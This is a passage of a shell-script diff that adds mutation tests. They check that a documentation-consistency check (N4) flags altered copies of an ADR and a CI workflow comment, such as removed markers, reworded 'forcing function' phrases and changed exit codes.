+  if cmp -s "$2" "$ADR119" && cmp -s "$3" "$WF"; then _h17+=" $1(did-not-land)"; return; fi
+  [[ -n "$(n4 "$2" "$3")" ]] || _h17+=" $1"
+}
+_jcs='^  # ── [(]#9927 item 9, #10432[)] SOLE-COPY'; _jce='^  sole-copy-protection-check:'   # the job comment block's bounds
+_p='dated re-protect follow-through issue'; _mk='verdict=matches-declared entry=web1'
+mut_lit "$ADR119" "$TMP/n4/adr.gone.md" '' '^@@never@@$' "$_p" "re-protect note"
+n4_mut adr-phrase-removed "$TMP/n4/adr.gone.md" "$WF"
+mut_lit "$WF" "$TMP/n4/job.gone.yml" "$_jcs" "$_jce" "$_p" "re-protect note"
+n4_mut job-phrase-removed "$ADR119" "$TMP/n4/job.gone.yml"
+mut_lit "$WF" "$TMP/n4/job.b4.yml" "$_jcs" "$_jce" "that issue is the only forcing function" "the forcing function is Guard B4"
+n4_mut job-says-guard-b4 "$ADR119" "$TMP/n4/job.b4.yml"
+mut_lit "$ADR119" "$TMP/n4/adr.b4.md" "$_adrs" '^## ' "issue is the only forcing function" "issue is a note; the forcing function is Guard B4"
+n4_mut adr-says-guard-b4 "$TMP/n4/adr.b4.md" "$WF"
+mut_lit "$ADR119" "$TMP/n4/adr.moved.tmp" "$_adrs" '^## ' "$_p" "re-protect note"
+{ printf 'The lift PR opens a %s.\n' "$_p"; cat "$TMP/n4/adr.moved.tmp"; } > "$TMP/n4/adr.moved.md" || fatal "n4 moved"
+n4_mut adr-phrase-outside-the-addendum "$TMP/n4/adr.moved.md" "$WF"
+awk -v p="$_p" '{print} /^  sole-copy-protection-check:/{print "    # The lift PR opens a " p "."}' "$TMP/n4/job.gone.yml" > "$TMP/n4/job.moved.yml" || fatal "n4 job moved"
+n4_mut job-phrase-below-the-job-header "$ADR119" "$TMP/n4/job.moved.yml"
+# CTO ruling 28 mutants, and the round-2 seats' (each must land; each must make n4 report).
+mut_lit "$ADR119" "$TMP/n4/adr.nomark.md" "$_adrs" '^## ' "$_mk" "verdict=matches-declared"
+n4_mut adr-marker-removed "$TMP/n4/adr.nomark.md" "$WF"
+mut_lit "$WF" "$TMP/n4/job.nomark.yml" "$_jcs" "$_jce" "$_mk" "verdict=matches-declared"
+n4_mut job-marker-removed "$ADR119" "$TMP/n4/job.nomark.yml"
+mut_lit "$ADR119" "$TMP/n4/adr.inngest.md" "$_adrs" '^## ' "$_mk" "verdict=matches-declared entry=inngest"
+n4_mut adr-marker-names-inngest "$TMP/n4/adr.inngest.md" "$WF"
+mut_lit "$WF" "$TMP/n4/job.nodate.yml" "$_jcs" "$_jce" "never the Date shape" "not the Date shape"
+n4_mut job-never-the-date-shape-removed "$ADR119" "$TMP/n4/job.nodate.yml"
+mut_lit "$WF" "$TMP/n4/job.reeval.yml" "$_jcs" "$_jce" "that issue is the only forcing function;" "that issue is the only forcing function (Re-evaluate by 2026-12-01);"
+n4_mut job-re-evaluate-by "$ADR119" "$TMP/n4/job.reeval.yml"
+mut_lit "$WF" "$TMP/n4/job.b4b.yml" "$_jcs" "$_jce" "that issue is the only forcing function" "Guard B4 is the forcing function"
+n4_mut job-guard-b4-is-the-forcing-function "$ADR119" "$TMP/n4/job.b4b.yml"
+# The marker moved out of the sole-copy job's comment into the drift-check job's (the old file-prefix scope accepted this).
+awk -v m="sole-copy-check $_mk" '/^  drift-check:/{print "  # A re-protect probe greps " m "."} {print}' "$TMP/n4/job.nomark.yml" > "$TMP/n4/job.markdrift.yml" || fatal "n4 marker moved"
+n4_mut job-marker-in-the-drift-check-comment "$ADR119" "$TMP/n4/job.markdrift.yml"
+# Observability mutant C (round 0's per-row assignment, with "follow-through" added, beside every required phrase) and D (B4
+# named the web-1 forcing function); only the either-order pairing ban sees them.
+mut_lit "$WF" "$TMP/n4/job.perrow.yml" "$_jcs" "$_jce" "and the forcing function is outside this job." "and the forcing function is outside this job: for \`inngest\`, the $_p; for \`web1\`, Guard B4, so a lift PR must edit that guard in review."
+n4_mut job-per-row-forcing-function "$ADR119" "$TMP/n4/job.perrow.yml"
+mut_lit "$ADR119" "$TMP/n4/adr.web1b4.md" "$_adrs" '^## ' "issue is the only forcing function." "issue is a note. Unlike the Inngest volume, which needs a $_p, Guard B4 is the web-1 forcing function."
+n4_mut adr-guard-b4-is-the-web-1-forcing-function "$TMP/n4/adr.web1b4.md" "$WF"
+# Verification pass (V5): a dotted path between B4 and "forcing function" (the old [^.]* pairing stopped at its dot), the
+# past-date exit or the leg condition put back to a Date-shape closure, and the other preposition of the trigger phrase.
+mut_lit "$ADR119" "$TMP/n4/adr.dotted.md" "$_adrs" '^## ' "issue is the only forcing function." "issue is the only forcing function. In practice Guard B4 in \`apps/web-platform/infra/workspaces-luks.test.sh\` is the web-1 forcing function."
+n4_mut adr-b4-pairing-across-a-dotted-path "$TMP/n4/adr.dotted.md" "$WF"
+mut_lit "$ADR119" "$TMP/n4/adr.exit0.md" "$_adrs" '^## ' "after it 5 (ACTION REQUIRED)" "after it 0 (PASS)"
+n4_mut adr-exit-0-past-the-date "$TMP/n4/adr.exit0.md" "$WF"
+mut_lit "$WF" "$TMP/n4/job.exit0.yml" "$_jcs" "$_jce" "5 after it" "0 after it"
+n4_mut job-exit-0-past-the-date "$ADR119" "$TMP/n4/job.exit0.yml"
+mut_lit "$ADR119" "$TMP/n4/adr.ran.md" "$_adrs" '^## ' "job succeeded and emitted" "job ran, or emitted"
+n4_mut adr-leg-ran-not-succeeded "$TMP/n4/adr.ran.md" "$WF"
+mut_lit "$WF" "$TMP/n4/job.reevalon.yml" "$_jcs" "$_jce" "that issue is the only forcing function;" "that issue is the only forcing function (re-evaluate on 2026-12-01, a Date-shape probe);"
+n4_mut job-re-evaluate-on "$ADR119" "$TMP/n4/job.reevalon.yml"
+if [[ -z "$_h17" ]]; then pass "H17 N4 goes RED on a copy with the phrase removed from the ADR addendum or the job comment, 'the forcing function is Guard B4' in either, the phrase moved out of the addendum or below the job header, the marker removed from either or naming inngest, 'never the Date shape' removed, 'Re-evaluate by' or 're-evaluate on' added, 'Guard B4 is the forcing function', the marker moved into the drift-check comment, a per-row forcing function naming B4, 'Guard B4 is the web-1 forcing function' (also across a dotted path), the past-date exit 0 in either text, and a leg that ran rather than succeeded"
+else fail "H17 N4 self-test: not caught:$_h17"; fi
 
 cmp -s "$LIBREAL" "$TMP/lib/bearer-curl.sh" || fail "Z0 the library copy drifted during the run"
 echo ""
